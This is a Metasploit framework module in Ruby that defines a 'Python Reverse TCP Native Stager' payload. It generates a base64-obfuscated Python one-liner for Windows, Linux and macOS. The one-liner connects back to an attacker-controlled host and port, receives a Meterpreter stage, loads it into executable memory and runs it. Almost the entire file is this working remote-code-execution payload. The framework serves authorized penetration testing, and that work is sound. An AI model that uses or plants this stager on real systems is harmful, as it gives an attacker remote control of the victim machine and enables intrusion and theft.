##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 1477

  include Msf::Payload::Stager

  def self.handler_type_alias
    "python_reverse_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse TCP Native Stager',
      'Description'   => 'Connect back to the attacker via python to load a native meterpreter stage',
      'Author'        => 'pasta <jaguinaga@faradaysec.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => ['osx', 'linux', 'win'],
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockrdi',
      'Stager'        => { 'RequiresMidstager' => false }))
  end

  def generate
    encoded_cmd = Rex::Text.encode_base64(command_string)
    "python -c \"import base64;exec(base64.b64decode(b'#{encoded_cmd}'))\""
  end

  def command_string
    %(import socket,struct,ctypes,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
sc = b'\\xbf'+struct.pack('<L', s.fileno())
if os.name == 'nt':
  stagelen = struct.unpack('<L', s.recv(4))[0]
  while stagelen>0:
    chunk = s.recv(stagelen)
    if chunk == '':
        break
    sc += bytearray(chunk)
    stagelen -= len(chunk)
  buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
  ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
  ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
  ctypes.windll.kernel32.RtlMoveMemory(ptr,buf,ctypes.c_int(len(buf)))
  ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
else:
  import mmap
  from ctypes.util import find_library
  sc += s.recv(4096)
  c = ctypes.CDLL(find_library('c'))
  c.mmap.restype = ctypes.c_void_p
  ptr = c.mmap(0,len(sc),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
  ctypes.memmove(ptr,sc,len(sc))
  c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
  c.mprotect(ptr,len(sc),mmap.PROT_READ|mmap.PROT_EXEC)
  ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put( [ payload.length ].pack('V') )
    return false
  end

end
